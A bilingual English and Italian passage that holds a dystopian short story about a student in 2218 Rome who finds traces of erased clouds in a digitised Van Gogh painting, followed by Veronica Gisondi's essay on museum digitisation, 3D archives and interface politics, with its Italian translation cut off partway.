He must still have been sleepy because for a second he confused the voice of the advertisement with that of Camilla, but as soon as he realised that it was only the personalised hologram, he kept walking without even giving it a second glance.
At that time of morning very few people were already inside the Archive.
In the center of the hall was a chubby girl who fidgeted nervously attempting to carry as much material in her brand new gloves, while, in the small room on the left, was the usual group of old people who spent their days there. One of them was raving against what his gargantuan viewer was showing him, two others, ecstatic, were handing each other some faithful reproductions of old devices and one, sitting on the side, seemed to be moved by a two-dimensional projection of a newscast.
Octavio didn’t really know where to start and, seeing those people so taken by their research, had already gotten him a little nervous, but as he now was already there, he put the fanny pack on a stool and slipped on his gloves.
Around him, white screens instantly appeared, on which he threw in bulk all the key words he had collected at university. The search required was rather simple, it was for the first part of the Privacy 1 exam, which consisted in the study of some 3D reproductions of paintings and sculptures depicting bridges, viaducts, overpasses, etc..
The purpose of the research was to analyse the development of security systems that led to the construction of the present anti-passage barriers.
He found structural analyses extremely boring, that’s why he had been postponing the research for days. However, if there was one thing that had always amused him, it was to take the pieces of art into his own hands. Those 3D models were so detailed that they faithfully reproduced every detail of those works, Octavio loved touching the surface of these finds and feeling under his fingertips the thickness of the brushstrokes and the texture of the chipped wood within frames.
Amongst the first results of the Archive, he was quickly struck by an ancient representation of Bosch.
Even though it had a fairly simple structure, the bridge depicted by the Dutch painter made evident the dangers and pitfalls that had allowed for the security measures of modern barriers. He could have started his presentation like this, why not?
So, after having touched the board and caressed the very light colour that covered it, he downloaded and filed it.
The 3D models of the architectural reproductions were certainly the most useful elements to take home, but even though he kept turning them around in his hands he couldn’t find any ones that spoke to him, so he chose a couple of the most complex and scenographic ones and filed them too.
After some research, he had at least a hundred 3D reproductions in front of him, and those grids were really starting to tire him out.
Then, suddenly, he saw the perfect bridge!
It was a drawbridge, like the current ones, and very articulated in its rudimentary architecture. When he noticed that it was a painting by Van Gogh he could not hide a bit of excitement and with a smug resolution he downloaded it and, without even looking at it in its complexity, he began to caress the brushstrokes that made it up. Van Gogh’s brushstrokes were by far his favourite, some were as tall as a finger and almost all of them were so stratified that they looked like small tree bark, rough and curved; those brushstrokes literally drove him crazy.
He caressed the whole painting several times, but his attention continued to be drawn repeatedly to some strange white reflections in the water, he had never seen so clear, he touched them again and again, almost as if he wanted to uncover the composition.
They were strange because he couldn’t understand what they might be reflection of. In the sky there was nothing, not the shadow of an airplane (even if it was not certain that they already existed at the time of Van Gogh), not a streetlamp, nor even shuttles or floating houses.
In the water, small segments were reproduced, united and dense, almost to create columns of smoke, but he did not understand what they could be, the sky was of the purest blue and extremely uniform just like the one he was used to seeing every day above his head, and yet in the water there was something white being reflected.
Octavio now no longer paid attention to the bridge, not even the brushstrokes but continued to be obsessed with those whitish spots.
He began a quick search and opened all the paintings by the same author that had skies in them, but he found nothing like it. Every sky painted by Van Gogh was blue, uniform and without any shade of colour, perhaps too uniform to be painted by Van Gogh, but it wasn’t the moment to go into strange artistic theories, it was not really his field, but he turned around and, turning his back on the page of the Archive, opened an online search window and wrote: “white objects in the sky.”
A series of planes, the latest generation of shuttles and seagulls were repeatedly shown among the blue and crystalline skies, but nothing that resembled those strange shapes that he saw reflected in the water.
Octavio was doubtful, he wasn’t sure he wanted to continue that search, he was a little worried and at the same time he feared that he had gotten a little too carried away by this obsession.
He looked around, as if he wanted to share his insecurity with someone.
When he looked up, the old men had doubled and some of them were arguing animatedly. The chubby girl was gone, but instead there were two young men walking through an ancient temple full of tombs and inscriptions. There were other boys in the background, but no one seemed to be paying him any attention.
In the midst of his doubt, he took the painting in his hands again and went back to looking at those reflections in the water.
He stayed like that for a while, then he filed a copy and looked up again in search of comfort.
In the distance he saw an employee of the Archive, they could be identified by the suspicious way in which they wandered between the corridors and the machines.
Octavio took off a glove and raised his hand, as fast as a hawk, the caretaker saw him and came his way.
He didn’t know exactly what to ask him, but as he waited for him he zoomed in on those white heaps that Van Gogh had painted in the water.
“What is it?”
“Hello, yes, so… I was looking at this painting… and I found these signs in the water… do you know what they are? What do they symbolise for Van Gogh? Because there doesn’t seem to be anything reflected in the water, in the sky there is nothing, so I didn’t understand what they could be…”
“Oh no.”
“What?”
“No, nothing. This file needs to be modified, we need to fix it. There must have been a system error that reproduced those stains taking them from some other painting, sometimes it happens… I’m so sorry, I’ll fix it right away, don’t worry.”
The tone of the caretaker had become extremely accommodating, he had never heard one speak to students in that way.
“Ah, okay. And yet they looked like original brushstrokes of the painting, see?”
“No, no, it happens sometimes, they are errors in the system, I told you, which overlap parts of some paintings on other paintings, now I’ll have it fixed and send it to you personally updated, without errors. Ah, have you already downloaded a copy by chance?”
“Yes, here it is… you’re welcome…”
“Great, excuse me again, I’m sure they’ll be working on it already in the offices, it’s a matter of minutes.”
“Yes yes don’t worry.”
Octavio was a little disoriented. He couldn’t think of anything but the fact that he so easily handed in his 3D copy of that painting. Why did he say he’d already downloaded a copy? Why had he not kept it for himself? He could have shown it to his mother, his grandfather, maybe even Camilla and, why not, they would have tried to understand it better together, it would have been fun.
Instead, no, he had handed it in and would never see it again.
Suddenly he had the impression that he was forgetting the shape of those white marks in the water. But then were they really white?
A chime announced the arrival of the new modified scan of the painting.
“We apologise for the inconvenience, your help has been greatly appreciated by the Team of the Tiber State Archive. Here’s a small reward for your help.”
A ribbon was flashing under the message, Octavio clicked and in front of his eyes a 25% discount appeared to buy the new 5 TB gloves advertised just outside.
“Thank you eh” whispered Octavio to the screen. He didn’t want those gloves, let alone a 25% discount to buy them.
He didn’t know what to do at that time, but he suddenly remembered that he was there to do some research for Privacy 1 and that the deadline was set for tomorrow.
He listlessly touched the new painting that had been sent to him and reopened it.
As soon as he saw it, he moved back slightly as if he was being hit.
Then he instinctively rubbed his eyes, also hurting himself because he had forgotten to take off his gloves. Everything was very strange, very different.
The flatness that previously characterised only the upper part of the painting now seemed to cross over into the river. Most of the brushstrokes that filled the surface of the water had been made uniform in color and some flattened even in their consistency.
It was true, the more Octavio observed that painting the harder it was to remember how the previous one was made and the disorientation that had overwhelmed him at the sight of the new file was now the only certainty that remained.
With a quick gesture he closed everything that was open in front of him. He didn’t even save the new painting, took the fanny pack from the stool and without looking around he headed towards the exit.
While walking, he slipped off his gloves, he was angry, even if he didn’t know the reason why, and wanted to throw those gloves on the ground, but he didn’t, and removing them he put them away distractedly in his fanny pack.
Along the avenue he heard the programmed voice of the advertisement that was talking to him again and at that moment he recognised every imperfection, from the cadence to the weird and automated articulation of the phrases, he thought he was really dumb to have mistaken it for Camilla’s voice only a few hours earlier.
He looked at his arm and with a gesture raised the volume of the music to the maximum.
It was not recommended to go around with the volume so high, not only for the safeguards of under-skin chips, but also because you were running the risk of not hearing any alarm or surrounding danger.
Octavio, not having better solutions, was simply venting his frustration and ignoring any kind of prudence. In an instant, however, he arrived at the house. The barriers would close in minutes for lunchtime, but he didn’t care, he climbed the stairs, opened the front door and turned on the live shows, that day he no longer wanted to think.
*2098 was the year in which the ECP (Erasing Clouds Program) was approved, which had foreseen the programmed elimination of every image, document, word and implicit reference to clouds. From the real skies the clouds had disappeared at least a decade before, but the artificial solutions to guarantee the climatic balance never succeeded in totally calming the polemics of the environmentalists and the bloody protests they had provoked.
By planning the elimination of any reference to clouds, the ECP would ensure the cancellation, in the long term, of any form of protest, also preventing curiosity in subsequent generations who would never have evidence of an ecosystem different from the current one.
Obviously the program took years to be complete and in 2218, 120 years later, there were still some small details left to be standardised.

Roma, 2218
Il sole splendeva già alto quella mattina in Piazza dei Ponziani e il cielo era azzurro vivo come sempre. Gli alberi stavano seguendo la loro consueta pulizia settimanale, l’odore dei cornetti caldi si diffondeva prepotente nelle abitazioni e le barriere antipassaggio, iniziavano ad abbassarsi per poi scomparire nel terreno.
Octavio viveva al quinto piano del palazzo all’angolo, quello con l’edera secolare dalle foglie iridescenti e quella mattina si era svegliato presto per via della ricerca che da giorni continuava a rimandare.
Octavio frequentava il primo anno di Ingegneria all’Università e non aveva mai amato andare all’Archivio Tiberino a studiare, era un palazzo troppo solenne per i suoi gusti, come se l’essere stato in precedenza un ospedale lo inquietasse a priori.
Quel giorno però non aveva altra scelta, il giorno dopo avrebbe avuto la consegna.
Si preparò, accese la musica ed uscì.
Le barriere non c’erano già più, il ponte era ormai basso e Octavio non aveva più scuse per tardare. Sin da quando era bambino però adorava vedere in azione i meccanismi delle barriere, dei ponti e degli acquedotti, che fossero in chiusura o in apertura, era qualcosa che lo aveva sempre affascinato. Vedere i confini del suo quartiere sollevarsi gli procurava sempre un leggero brivido; sentiva, in maniera tangibile, la fine o l’inizio di una possibilità, inesorabile e incontrovertibile e quell’attesa davanti ai meccanismi in funzione lo emozionava sempre, al punto tale da innervosirsi tutte le volte che qualche struttura si incastrava a metà strada, cosa che capitava molto spesso per via delle complesse fondamenta della città.
Ad ogni modo quel giorno non c’erano barriere ad emozionarlo né a farlo innervosire e in men che non si dica si trovò difronte al grande giardino dell’Archivio Tiberino.
“Ciao Octavio, hai visto i nuovi guanti con 50 TB di memoria? Il modello che hai tu ha 4 anni ormai, perché non provi questi?”
Doveva essere ancora assonnato perché per un secondo scambiò davvero la voce della pubblicità per quella di Camilla, ma appena si rese conto che si trattava solo dell’ologramma pubblicitario personalizzato, tirò dritto senza nemmeno degnarlo di uno sguardo.
A quell’ora di mattina erano in pochi ad essere già dentro l’Archivio.
Al centro della sala c’era una ragazzina paffuta che agitava nervosamente le braccia caricando più materiale possibile nei suoi guanti blu nuovi di zecca, mentre, nella piccola saletta di sinistra, c’era il solito gruppo di vecchietti che passava lì le sue giornate. Uno di loro inveiva contro quello che il suo sgarrupato visore gli stava proponendo, altri due, estasiati, si passavano tra le mani alcune riproduzioni fedeli di vecchi dispositivi e uno, seduto in disparte, sembrava commuoversi davanti a una proiezione bidimensionale di un telegiornale.
Octavio non sapeva bene da dove cominciare e, vedere quelle persone così prese dalle loro ricerche, lo aveva già innervosito, ma ormai era lì, posò il marsupio su uno sgabello e infilò i guanti.
Attorno a lui comparvero subito delle schermate bianche sulle quali scaraventò alla rinfusa tutte le parole chiave che aveva raccolto all’università. Si trattava di una ricerca piuttosto semplice, richiesta per la prima parte dell’esame di Privacy 1 che consisteva nello studio di alcune riproduzioni 3D di dipinti e sculture raffiguranti ponti, viadotti, cavalcavia etc.
Lo scopo della ricerca era quello di analizzare lo sviluppo dei sistemi di sicurezza che avevano portato alla costruzione delle attuali barriere antipassaggio.
Trovava le analisi strutturali estremamente noiose, per questo continuava da giorni a rimandare quella ricerca. Tuttavia se c’era una cosa che lo aveva sempre divertito era prendere in mano le opere d’arte. Quei modelli 3D erano così dettagliati da riprodurre fedelmente ogni minimo particolare di quei lavori e Octavio adorava sfiorare la superficie dei reperti e sentire sotto i suoi polpastrelli lo spessore delle pennellate e la consistenza del legno scheggiato delle cornici.
Tra i primi risultati dell’Archivio fu subito colpito da un’antica rappresentazione di Bosch.
Seppur molto semplice nella struttura, quel ponte raffigurato dal pittore olandese, rendeva tangibili i pericoli e le insidie che avevano reso necessarie le misure di sicurezza delle moderne barriere. Avrebbe potuto aprire così la sua presentazione, perché no.
Così dopo aver toccato la tavola e accarezzato il leggerissimo colore che la ricopriva, la scaricò e l’archiviò.
I modellini 3D delle riproduzioni architettoniche erano sicuramente gli elementi più utili da portare a casa, ma nonostante continuasse a girarseli tra le mani non ne trovava nessuno di particolare, così ne prese un paio tra quelli più complessi e scenografici e archiviò anche quelli.
Dopo un po’ di ricerca aveva di fronte a sé almeno un centinaio di riproduzioni 3D e quelle griglie cominciavano davvero a stancarlo.
Poi, all’improvviso, vide il ponte perfetto!
Si trattava di un ponte levatoio, come quelli attuali, e molto articolato nella sua architettura rudimentale. Quando si accorse che si trattava di un dipinto di Van Gogh non riuscì a nascondere un briciolo di eccitazione e con un risolino compiaciuto lo scaricò e, senza neppure guardarlo nella sua complessità, iniziò ad accarezzare le pennellate che lo componevano. Quelle di Van Gogh erano di gran lunga le sue preferite, alcune erano alte quanto un dito e quasi tutte erano così stratificate da sembrare delle piccole cortecce d’albero, ruvide e curvate; lo facevano letteralmente impazzire quelle pennellate.
Accarezzò tutto il dipinto più volte, ma la sua attenzione continuava ripetutamente ad essere attirata da alcuni strani riflessi bianchi nell’acqua, non ne aveva mai visti di così chiari, li toccava e li ritoccava, quasi a volerne scoprire la composizione.
Erano strani perché non riusciva a capire di cosa potessero essere il riflesso. In cielo non c’era nulla, né l’ombra di un aereo (anche se non era sicuro esistessero già all’epoca di Van Gogh), né un lampione, né tantomeno navette o abitazioni fluttuanti.
Nell’acqua erano riprodotti piccoli segmenti uniti e fitti quasi a creare delle colonne di fumo, ma non capiva cosa potessero essere, il cielo era di un azzurro purissimo e dal colore estremamente uniforme proprio come quello che era abituato a vedere tutti i giorni sopra la sua testa, eppure nell’acqua c’era riflesso qualcosa di bianco.
Octavio improvvisamente non prestava più attenzione al ponte, neppure alle pennellate, ma continuava a essere ossessionato da quelle macchie biancastre.
Iniziò una ricerca veloce e aprì tutti i quadri dello stesso autore che avevano dei cieli al loro interno, ma non trovò nulla di simile. Ogni cielo dipinto da Van Gogh era azzurro, uniforme e senza alcuna sfumatura di colore, forse anche troppo uniformi per essere dipinti da Van Gogh, ma non era il caso di addentrarsi in strane teorie artistiche, non era proprio il suo campo, così si voltò e, dando le spalle alla pagina dell’Archivio, aprì una finestra di ricerca online e scrisse: “Oggetti bianchi nel cielo”.
Una carrellata di aerei, navette di ultima generazione e gabbiani si ripetevano tra i cieli azzurri e cristallini, ma nulla che assomigliasse a quelle strane forme che vedeva riflesse nell’acqua.
Octavio era dubbioso, non era sicuro di voler continuare quella ricerca, era un po’ preoccupato e allo stesso tempo temeva di essersi fatto prendere un po’ troppo la mano da quell’ossessione.
Si guardò in giro, quasi a voler condividere con qualcuno quell’insicurezza.
Quando alzò lo sguardo i vecchietti erano raddoppiati e alcuni di loro stavano discutendo animatamente. La ragazza paffuta non c’era più, ma al suo posto c’erano due giovani che camminavano dentro un tempio antico pieno di tombe e iscrizioni. C’erano altri ragazzi sul fondo, ma nessuno sembrava fare al caso suo.
Nel dubbio prese di nuovo in mano il quadro e tornò a guardare quei riflessi nell’acqua.
Rimase così per un po’, poi ne archiviò una copia e alzò di nuovo lo sguardo in cerca di conforto.
In lontananza vide un addetto dell’Archivio, si riconoscevano dal fare sospettoso con il quale si aggiravano tra i corridoi e i macchinari.
Octavio si sfilò un guanto e alzò la mano. Veloce come un falco il custode lo vide e andò verso lui.
Non sapeva bene cosa chiedergli di preciso, ma lo aspettò mentre zoomava su quei cumuli bianchi che Van Gogh aveva dipinto nell’acqua.
“Che c’è?”
“Salve, si, ecco…stavo guardando questo quadro…e ho trovato questi segni nell’acqua…lei sa cosa sono? Cosa simboleggiano per Van Gogh? Perché non sembra esserci qualcosa che si riflette nell’acqua, in cielo non c’è nulla, quindi non capivo cosa potessero essere…”
“O no.”
“Cosa?”
“No, niente. Questo file deve essere modificato, dobbiamo aggiustarlo. Ci dev’essere stato un errore del sistema che ha riprodotto quelle macchie prendendole da qualche altro quadro, a volte capita…mi dispiace tanto, adesso lo faccio sistemare subito, non si preoccupi.”
Il tono del custode era diventato estremamente accomodante, non ne aveva mai sentito uno parlare in quel modo agli studenti.
“Ah, ok. Eppure sembravano pennellate originali del dipinto, vede?”
“No no, sa a volte capita, sono errori del sistema, le ho detto, che sovrappongono parti di alcuni dipinti su altri quadri, adesso lo faccio sistemare e glielo mando personalmente aggiornato, senza errori. Ah, ne ha già scaricato una copia per caso?”
“Si, eccola…prego…”
“Benissimo, mi scusi ancora eh, sono sicuro che negli uffici ci staranno già lavorando, è questione di minuti.”
“Sisi, non si preoccupi.”
Octavio era un po’ disorientato. Non riusciva a pensare a nient’altro che al fatto di aver consegnato con tanta facilità la sua copia 3D di quel dipinto.
Perché aveva detto di averne già scaricata una copia? Perché non l’aveva tenuta per sé? Avrebbe potuto farla vedere a sua madre, a suo nonno, forse anche a Camilla e, perché no, avrebbero cercato insieme di capirci di più, sarebbe stato divertente.
Invece no, l’aveva consegnata e non l’avrebbe mai più rivista.
All’improvviso ebbe l’impressione di non ricordarsi nemmeno più la forma di quei segni bianchi nell’acqua. Ma poi erano davvero bianchi?
Un trillo annunciò l’arrivo della nuova scansione modificata del dipinto.
“Ci scusiamo per il disagio, il suo aiuto è stato molto apprezzato dal Team dell’Archivio Tiberino di Stato. Ecco a lei una piccola ricompensa per il suo aiuto.”
Un fiocchetto lampeggiava sotto il messaggio, Octavio cliccò e davanti ai suoi occhi comparve uno sconto del 25% per acquistare i nuovi guanti da 5 TB pubblicizzati all’esterno.
“Grazie eh” sussurrò Octavio allo schermo. Non voleva quei guanti, figurarsi uno sconto del 25% per comprarli.
Non sapeva cosa fare in quel momento, ma si ricordò improvvisamente che era lì per la ricerca di Privacy 1 e che la consegna sarebbe stata il giorno dopo.
Toccò svogliatamente il nuovo dipinto che gli era stato inviato e lo riaprì.
Appena lo vide indietreggiò come quando si viene colpiti leggermente sul naso.
Poi istintivamente si strofinò gli occhi, facendosi anche un po’ male perché si era dimenticato di togliersi i guanti. Era tutto molto strano, molto diverso.
La piattezza che prima caratterizzava solo la parte superiore del dipinto ora sembrava sconfinare nel fiume. La gran parte delle pennellate che riempivano la superficie dell’acqua erano state uniformate nel colore e alcune appiattite anche nella loro consistenza.
Era ufficiale, più Octavio osservava quel dipinto più faceva fatica a ricordarsi come era fatto il precedente e il disorientamento che lo aveva travolto alla vista del nuovo file era ormai l’unica certezza che gli rimaneva.
Con un gesto veloce chiuse tutto ciò che era aperto davanti a lui. Non salvò nemmeno il nuovo quadro, prese il marsupio dallo sgabello e senza guardarsi intorno si avvio verso l’uscita.
Camminando si sfilò i guanti, era arrabbiato, anche se non sapeva bene il motivo, e aveva voglia di gettarli per terra quei guanti, ma non lo fece e togliendoseli alla rovescia lì infilò distrattamente nel marsupio.
Lungo il viale sentì di nuovo la voce programmata della pubblicità che parlava con lui, in quel momento ne riconobbe ogni imperfezione, dalla cadenza alla stramba e non disinvolta articolazione delle frasi, pensò di essere stato davvero stupido ad averla scambiata per la voce vera di Camilla poche ore prima.
Si guardò il braccio e con un gesto alzò il volume della musica al massimo.
Era sconsigliato andare in giro con il volume così alto, non solo per la salvaguardia dei cip sottopelle, ma anche per il rischio di non sentire assolutamente alcun allarme o pericolo circostante.
Octavio non avendo soluzioni migliori stava semplicemente sfogando la sua frustrazione ignorando ogni tipo di prudenza. In un attimo, però, arrivò sotto casa. Le barriere si sarebbero chiuse a minuti per l’ora di pranzo, ma a lui non interessava, salì la scala, aprì la porta di casa e accese i live, quel giorno non aveva più voglia di pensare.
*Il 2098 è l’anno in cui fu approvato L’ECP (Erasing Clouds Program) che aveva previsto l’eliminazione programmata di ogni immagine, documento, parola e implicito riferimento alle nuvole. Dai cieli reali le nuvole erano scomparse almeno un decennio prima, ma le soluzioni artificiali per garantire l’equilibrio climatico non riuscirono mai a placare totalmente le polemiche degli ambientalisti e le cruente proteste che avevano suscitato.
Programmando l’eliminazione di ogni riferimento alle nuvole, l’ECP avrebbe garantito la cancellazione, a lungo termine, di ogni forma di protesta, prevenendo anche e soprattutto la curiosità nelle generazioni successive che non avrebbero mai avuto le testimonianze di un ecosistema differente da quello attuale.
Ovviamente il programma impiegò anni per essere completo e nel 2218, ben 120 anni dopo, rimaneva ancora qualche piccolo dettaglio da uniformare.

FALLING THROUGH THE CLOUD
by Veronica Gisondi
There’s something that transcends the longstanding fascination for the exploration of the unknown. It goes beyond planning the future of humanity through utopian projects like terraforming to ensure its preservation. However, it still relates to the way non-terrestrial environments and the Solar System attract human curiosity. A certain “lure of the void” might be the cause. It is a concept articulated by Nick Land, who re-contextualises the perception of gravity as a paradigm of captivity. The Apollo program and 1969’s first moon landing evidenced how, as gravity had been defied, the limit once set by space travel became an image of advancement in itself, as well as a fuel that fostered the establishment of forms of softer authority, territorial-political strategy and social organisation. Space as a frontier turned into a horizon of escapism: it was the symptom of a refusal of limitations to growth and expansion.1 Thus escaping the Earth and its “gravitational confinement” can be read as a means, not an end, that focuses on overcoming the split between terrestrial dimension and orbit, the ultimate limit and threshold leading to a metaphysical outside. The Earthrise photograph, taken from lunar orbit in 1968, was the first portrayal of Earth from an external position. Remote, in the black depths of outer space, Earth finally appeared in its entirety, suggesting a new, absolute scale, a totality to be measured, mapped and governed.2 Archetypal distances collapsed, and gaps in meaning, space and time alike seemed to disappear.
“We were told not to look back from orbit, but of course, we did, and what we saw pulled us back down. The damnation of our extraterrestrial out-leap gave birth to a lucid environmentalist vision—the earth seen from space.”3
As Land points out, every descent from the heavens is now a fall. Events unfolded as in a prophetic fable, one that foretold what would later become ordinary circumstances for digital users. If gravity has been keeping us somewhere, limiting our perception, then “lift-off” from planet Earth is, metaphorically, an epiphany to the numerous anti-gravity technologies that came after and reenacted the same “outward momentum” in the effort to evade embodied vision.4

Since then, a similar condition of fluctuation has been absorbed as characteristic of the design and functionalities of software interfaces. For their users, interfaces work as instrumental images, decoding the functions of platforms; they are “dream worlds, however restricted.”5 They enable us to visualise objects in isolation, in blank, abstract fields that can shape exceptionally lucid visions. Augmented clarity is achieved by removing external distractions and background presences – the noise of physical reality. This dynamic feels comfortably familiar, and it’s something I have personally internalised.
Growing up in the 1990s, when the diffusion of interface-mediated vision through personal computers started to peak, led me to perceive that particular possibility to “see” – that is, beyond the two-dimensional screen – as novel. The first 3D computer graphics video games and interactive .exe programs were still a very exciting experience for the child-me of the early 2000s. Technological advancements in digital imaging have made floating 3D renders of items a common encounter today: previews of purchasable items and free-roaming world maps developed on platforms like Google Earth and Google Street View engage users through 3D optics, as do the virtual tours of exhibition spaces provided by Google Arts & Culture. More recently, museums as well have started to employ digital systems to transform their archives into online resources, and the practice has spread quickly.
In July 2017, the first Sketchfab model of the Rosetta Stone appeared on the Internet. Today, the British Museum is one among many cultural institutions that are investing in capturing and uploading substantial parts of their collections in 3D form. Examples of other digitised stones include Harvard Semitic Museum’s uploads of ostrakon (ancient Greek and Egyptian pieces of broken ceramic on which letters, election polls, receipts, and exiles are transcribed); and Museum of Archaeology and Anthropology at Cambridge, whose online display includes several ancient Mayan stele that carry information about lunar calendars, astronomy, supernatural entities and alternating time frames. Existing anew as scanned data, a plethora of historical artifacts is suspended in interfaces such as Sketchfab and Scan the World. Ancient sculptures, prehistoric relics and monoliths coexist in the platform with community-generated 3D scans and designs. One can find an accurate reproduction of an aircraft cockpit as well as a hyper-detailed scan of the main portal of Notre-Dame de Paris. Indexed, searchable, downloadable and printable. Cultural institutions have been working with scanning technologies to increase the scope of their digital archives by adding more scans, asserting their presence as plugged-in, eminent organisations that care about being globally accessible. Having been granted access to hundreds of globally disseminated archives and collections, users supposedly benefit from the democratisation of museum collections and the increased accessibility to international cultural heritage. Hence, de-hierarchisation may seem a genuinely positive gesture, an act of generosity towards what is often referred to as ‘wider public.’

Museums have been programming material image banks since the age of enlightenment in the 18th century, with visual encyclopedias and image-based supplements.6 Today museum archives merge with the digital, and they become data. By implementing the database as an operational logic, collections are transformed into digitised online resources that embrace new desires and haptic expectations. These have become abstract as the speed of technological advancements promises a distinct type of aesthetic experience, one that reproduces tactile qualities which were originally unique to physical reality, such as volume, material or texture. Supported by hardware, virtual spaces allow the visitor-become-user to engage with each uploaded object. What is observable though is mostly an increased availability of images. Artifacts are made visible through interfaces with a brief description attached; they manifest themselves in a different, unfamiliar domain, where both the user’s locality and the museum’s geographic specificity seem not to influence how information is consumed. The aforementioned transformation feeds into the notion that things that are “formally equivalent” by their shared condition (in this case computability, which leads to their existence as 3D models), are, as a consequence, “ontologically and culturally equivalent,”7 thus implying that their nature and cultural value are also comparable. Each item shifts into a dimension where the interface, as means of navigation, is the only mediator between what is visible – what can be known – and the invisibilities of software.8
The first message that pops up when we access the digital archive is “Loading 3D model…,” followed by “click & hold to rotate.” Like portals built on the edge of a separate dimension, interfaces take in our gaze and transmit our gestures. Their response comes from somewhere beyond visible processes. Indeed, as Benjamin H. Bratton notes, “Platforms don’t look like how they work and don’t work like how they look”: users tend to understand their interactions in relation to the hierarchies determined by graphical user interfaces, but these don’t correspond to the actual structure of interactions within the platform.9 Media interactivity feeds off the imbalance between the user’s need for constant communication, the ideal of always-available information and the possibilities that technology allows in terms of designing and claiming opaque governmental spaces. This relationship characterises platform sovereignty as it associates geographic illegibility with a massive accumulation of interactions: the mechanism that limits our activity is autocratic, and because it provides an apparent liberty of use, it ultimately enforces the platform’s standardising power.10 Model Inspector, View in VR, Theater mode and Fullscreen are some of the executable commands on Sketchfab, and below the interactive viewer, users see Download, View and Like counts, along with the number of triangles and vertices that compose the model and a link to the material’s copyright license. As “software links visual cues to unseen forces”, the images we see are merely the outer layer of a system constituted from below, an infrastructure made invisible by exploiting the inherently “unknowable” essence of data execution.11
The longing to explore what can’t be seen translates into the will to understand “the diagrams we seek to inhabit,” as Wendy Hui Kyong Chun describes.12 Interfaces like those employed by museums to present their digital collections offer to our seemingly sovereign subjectivity a chance to “map” the network by directing our navigation and enabling file storage. At the same time, every interaction is being mapped.13 With the disappearance of the horizon and physical referents a different kind of place-ness comes into play, and our concept of location is inevitably transformed. Artworks are now seen in the virtual scenario set up by the interface. The gaze is de-territorialised, the point of view suspended, and the user is in “free fall” into meaning.14 It is apparent that the act of distancing oneself from everything in order to become able to see from ‘nowhere’ is a foundational property of several technological instruments of visualisation, including radar imaging, panoramas of images stitched by algorithms and computer-generated virtual reality experiences provided by VR headsets. Computation technologies operate in ways that surpass and overflow regular cartographies.15 In a sense, disembodiment may seem more of an achievement than a disquieting side effect of transcending geographic location, if we consider that the eye can finally escape physical limits and observe from a detached, all-seeing ‘above,’ as defined by – and corresponding to – the virtual outside. Programming an environment fundamentally presupposes the deletion of indeterminacy, the design of a calculable reality where the weight of the real becomes more graspable as it can be pictured, rationalised and monitored.
Moving through the network and searching the database for information may suggest a deeper involvement with those anti-gravitational ambitions that, in the mid-20th century, pushed humans to escape earth-based spatial coordinates. That lack of ground now affects every user’s perception. As we share, understand and interpret the world mostly through the mediation of language (and text as a form), we often end up seeing “what one says about things.”16 Language is active at the infrastructural level and, not unlike software, hardware and code, it is always posited as already existing, self-evident, a source.17 The crucial role of language in the work of museums and archives goes well beyond their status as repositories of knowledge. The feeling that archives enable us to see the complete structure of a globally orchestrated system, where art, culture and history are spread out before us in luminous network diagrams, is an illusion: even though today’s cultural imperative seems to be “more data is better,” the archive can only ever be “partial,” “incomplete,” and able to give us “coded answers” told through technologies that change “the very meaning of what is being transmitted.”18 This conflict can be detected in the context of digital archives by observing the way online institutional mediation occupies structures of perception, like those seen on Sketchfab. It resides in the facile transference that is at the essence of the digitisation of museum collections. In the guise of philanthropic enthusiasms, these procedures seemingly ignore their own vagueness of intention as well as the nature of information. Museums eventually reinforce systematic forms of knowledge policing while radically altering the significance of the objects they decide to convert. Any effort to grasp reality and its nonlinear leaps, fragmented tempo and intangible limits has to take into account the suppression of complexity inherent in the current disposition of interfaces, programs and devices that mold contemporary database-driven archives.
Within this framework, what constitutes an institutional operation, and how does it influence the process of knowing? With its ever-changing nature and unbound location, the digitised archive proves to be a positively challenging ground to rethink how institutions are narrating the present, both linguistically and visually, and how knowledge can be processed otherwise.19 Data introduces models of reading that create a distance from textual analysis, and thus may still be used to generate fruitful interruptions by temporarily suspending the knowing subject’s familiarity with the linguistic and visual realm. As we fall through the cloud, we also leap across continents of data, navigate among islands of meaning, and swim in infinite rivers of information. Learning to understand the networks we landed on means realising that they cannot be interpreted as a text, neither as a pure image. In the light of this shift, it could be useful to reframe the topic by summoning an interpretation of “geography” as “earth-writing” – a way to write space as well as to express, communicate and politicise the images that make up those new terrains.20 This time, however, the interplay between us and unknown land ought to be different from past yearnings toward outer space. Decoding scattered information may require us to abandon hermeneutics and implement a model of seeing that involves other modalities of knowing, such as “scanning,” “rearranging,” “filtering,”21 and reconnecting across the abyss we fear to look into – the openings and depths of data. We may just need to embrace the cloud.

CADENDO ATTRAVERSO LA NUVOLA
di Veronica Gisondi
C’è qualcosa di trascendentale nel fascino per l’esplorazione dell’ignoto. Qualcosa che va oltre utopie progettuali per salvaguardare il futuro dell’umanità, come nel caso del terraforming. Ma è qualcosa di ancora legato al modo in cui gli ambienti non terrestri e il Sistema Solare stimolano la curiosità umana. Una certa “attrazione del vuoto” {lure of the void} potrebbe esserne la causa. È un concetto articolato da Nick Land, che ricontestualizza la percezione della gravità come paradigmatico per una condizione di cattività. Il programma Apollo e il primo atterraggio sulla Luna del 1969 hanno dimostrato come, nel momento in cui la gravità è stata elusa, il limite che un tempo corrispondeva ai viaggi nello spazio era diventato di per sé un’immagine del progresso, che allo stesso tempo alimentava la fondazione di forme più sottili di autorità, di strategie politico-territoriali e di organizzazione sociale. Lo spazio inteso come frontiera era diventato un orizzonte di fuga: un sintomo del rifiuto dei limiti imposti alla crescita e all’espansione.1 Così la fuga dalla Terra e dalla rispettiva “prigionia gravitazionale” può essere letta come mezzo, e non fine, concentrato sul superamento della divisione tra la dimensione terrestre e l’orbita, il limite ultimo e la soglia che portava ad un esterno metafisico. La fotografia Earthrise, scattata dall’orbita lunare nel 1968, fu il primo ritratto della Terra proveniente da una posizione esterna al pianeta. Remota, immersa nelle profondità nere dello spazio, la Terra apparve finalmente nella sua interezza, suggerendo l’esistenza di una nuova scala assoluta, una totalità da misurare, mappare e governare.2 Le distanze archetipiche collassarono, e i gli intervalli nel significato, nello spazio e nel tempo sembrarono scomparire.
“Ci era stato detto di non voltarci e guardare indietro dall’orbita, ma ovviamente, così facemmo, e quello che avevamo visto ci attrasse nuovamente verso il basso. La dannazione del balzo verso l’extraterrestre diede luce ad una lucida visione ambientalista–la terra vista dallo spazio.” {We were told not to look back from orbit, but of course, we did, and what we saw pulled us back down. The damnation of our extraterrestrial out-leap gave birth to a lucid environmentalist vision—the earth seen from space.}3
